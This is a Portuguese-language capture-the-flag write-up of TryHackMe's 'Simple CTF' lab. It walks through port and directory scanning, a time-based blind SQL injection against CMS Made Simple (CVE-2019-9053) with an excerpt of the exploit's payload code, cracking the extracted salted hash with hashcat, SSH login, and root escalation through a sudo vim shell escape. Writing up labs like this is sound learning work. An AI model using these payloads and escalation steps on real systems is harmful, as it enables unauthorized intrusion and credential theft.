# [Simple CTF] — [CTF / TryHackMe]

> **Categoria:** `Web` · `Linux` - **Dificuldade:** 🟢 Fácil -  **Pontos:** `300 pts` · **Data:** 16/04/2026 - **Autor do desafio:** `MrSeth6797` 

---

## TL;DR

> O desafio expõe um CMS vulnerável a SQLi baseada em tempo (CVE-2019-9053). Extraí credenciais com um exploit adaptado para Python2, craquei com hashcat e escalei privilégios via vim SUID para obter acesso root.

---

## 📌 Descrição

> Beginner level ctf

**Arquivos fornecidos:**
- `10.64.161.157`

**Acesso:**
- URL: `http://10.64.161.157`

---

## 🔍 Reconhecimento

Como eu tinha apenas o IP da máquina eu resolvi começar com o nmap para verificar quais portas estavam abertas e, consequentemente traçar uma melhor abordagem em cima dessas portas. 

```bash
# enumerando portas com nmap
nmap -sV -sC -Pn -oN nmap.txt 10.64.161.157

# output
21/tcp   (FTP)  - vsftpd 3.0.3
80/tcp   (HTTP) - Apache 2.4.18 (Ubuntu)
2222/tcp (SSH)  - OpenSSH 7.2p2
```

```bash
# enumerando diretórios com o gobuster
gobuster dir -u http://10.64.161.157 -w /usr/share/wordlists/dirb/common.txt

# output
robots.txt   (Status: 200)
simple       (Status: 301) [--> http://10.64.161.157/simple/]
```

**Observações relevantes:**
- FTP permite login anônimo e possui conexão em texto plano (sem criptografia)
- Falha em listar diretórios (possível restrição)
- robots.txt menciona diretório sensível: ```/openemr-5_0_1_3```. Acesso sem sucesso
- SSH em porta não padrão (2222)
- Identificado, através do gobuster, um diretório '/simple/'

---

## 🧠 Raciocínio

Após observar o output do nmap, logo soube que deveria começar pela página web em busca de uma vulnerabilidade. Foi identificado, através do gobuster, um diretório chamado ```simple/```. Nele, achei o nome e a versão do sistema de gerenciamento do site, CMS Made Simple v2.2.8. Usei o comando ```searchsploit cms made simple``` no kali e localizei uma vulnerabilidade de SQLi.

Ao rodar o exploit, tive um pequeno problema com a biblioteca termcolor e com a versão do Python no qual foi criado o exploit, então precisei adaptar o código, removendo a biblioteca e adaptando para o Python2. Após o ataque consegui 3 dados importantes: username, password e salt password. Aqui foi a parte que me confundiu bastante, usando o comando ```hash-identifier``` percebi que, o hash '1dac0d92e9fa6bb2' havia 2 possibilidades de tipos (MD5 e MySQL) já o hash '0c01f4468bd75d7a84c7eb73846e8d96' é MD5. Não sabia se isso, o tipo de codificação, influenciava na hora de crackear, mas pelo visto não. Pelo o que pesquisei, existia a possibilidade de crackear como hashcat e johntheripper, preferi o hashcat.

Após o crack, consegui a senha ```secret```. Com a senha em mente imaginei que deveria ser o acesso do SSH. Bingo! Máquina violada, no diretório ```/home/mitch``` encontrei o arquivo 'user.txt' com a primeira flag do desafio. Em seguida, suspeitei de que a outra flag ficaria dentro do usuário root. Executei o comando ```sudo -l``` para ver os binários com permissão de execução e identifiquei que o root havia permissão para ```/usr/bin/vim```. Dei uma pesquisada e escalei privilégios com o comando ```sudo vim -c ':!/bin/bash'``` após isso, o prompt de root foi exibido. Já na parte final do desafio entrei na pasta de root e lá estava a última flag ```root.txt```.

---

## 🛠️ Exploração

```python
# Ataquei com SQLi
python2 exploit2.py -u http://10.64.161.157/simple/
```
```bash
# Quebrei os hashes com hashcat
hashcat -m 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```

### Passo 1 — Tentativa de exploração com SQLi

*O exploit tenta executar comandos manipulando entradas do usuário*

```python
# Exemplo de script de exploração
payload = (
    "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")"
    "+from+cms_users"
    "+where+password+like+0x" + ord_password_temp + "25"
    "+and+user_id+like+0x31)+--+"
)

url = url_vuln + "&m1_idlist=" + payload

start_time = time.time()
r = session.get(url)
elapsed_time = time.time() - start_time

# Se o servidor demorou >= TIME segundos, o caractere está correto
if elapsed_time >= TIME:
    password = temp_password  # confirma o caractere e avança
```

**Output obtido:**
```
Salt for password found: 1dac0d92e9fa6bb2
Username: mitch
Email found: admin@admin.com
Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

---

### Passo 2 — Quebrando hashes

*Usando o hashcat para quebrar os hashes e conseguir a senha do SSH*

```bash
# Comando usado
hashcat -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```

**Output obtido:**
```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

---

### Passo 3 — Acessando a máquina via SSH

```bash
# Acessei o servidor via SSH
ssh -p 2222 mitch@10.64.161.157
```

*Já dentro da máquina executei ```sudo -l``` para identificar os binários com permissão de root. A máquina retornou ```/usr/bin/vim```*

```bash
# Escalei privilégios com vim
sudo vim -c ':!/bin/bash'
```

```bash
cd /home/mitch -> user.txt
cd root/       -> root.txt
```

---

## 🚩 Flag

```
user.txt {G00d j0b, keep up!}
root.txt {W3ll d0n3. You made it!}
```

---

## 📚 Conceitos e técnicas


| Conceito/Ferramenta | Como foi utilizado |
|---|---|
| SQL Injection baseada em tempo (Blind SQLi) | O exploit injeta um sleep() condicional na query. Se o servidor demora >= N segundos para responder, o caractere testado está correto. O ataque extrai os dados um caractere por vez, sem retorno direto de dados na resposta HTTP. Técnica usada: CVE-2019-9053 no parâmetro m1_idlist no môdulo News do CMS Made Simple. |
| GTFOBins / sudo vim | Binários com permissão sudo podem ser abusados para escapar para um shell. O vim permite execução de comandos externos via :!/bin/bash, resultado em shell root. |

---

## 🔗 Referências

- [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)
- [GTFOBins / Vim](https://gtfobins.org/gtfobins/vim/)

---

## 💬 Considerações finais

*Foi um desafio relativamente simples, mas com algumas dificuldades sofridas por ainda não ter uma certa experiência em CTFs, contudo, nada que me impeça de continuar crescendo e querendo me aperfeiçoar mais. Por ser o meu primeiro desafio resolvido, guardarei os conhecimentos obtidos aqui com muito carinho. Me conta você, o que faria de diferente?*

---

<div align="center">
  <sub>Write-Up por <a href="https://github.com/seu_usuario">BrennoSantAnna</a> · <a href="https://linkedin.com/in/brennosantanna">LinkedIn</a></sub>
</div>
